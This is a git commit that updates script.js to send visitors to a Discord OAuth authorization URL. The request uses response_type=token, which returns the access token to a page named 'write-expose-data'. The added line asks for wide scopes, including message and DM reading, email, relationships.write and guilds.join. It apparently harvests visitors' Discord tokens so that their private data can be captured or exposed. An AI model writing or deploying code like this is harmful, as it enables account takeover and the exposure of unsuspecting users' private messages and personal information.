b904c97c81fca2bc7d15158d7eec6c2ab43368ba
cdc <96666783+cdc-sys@users.noreply.github.com>
2024-05-20 14:02:19 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-window.location.replace("https://discord.com/oauth2/authorize?client_id=1120343691094142986&redirect_uri=https%3A%2F%2Fexposed.cddisccase.repl.co%2Fwrite-expose-data&response_type=token&scope=identify%20gdm.join")
+window.location.href = "https://discord.com/oauth2/authorize?client_id=1242084287306797147&response_type=token&redirect_uri=https%3A%2F%2Fcdc-replit-archive.github.io%2Fglitched-gc%2Fwrite-expose-data&scope=identify+messages.read+dm_channels.read+openid+relationships.write+role_connections.write+dm_channels.messages.read+email+guilds.join"
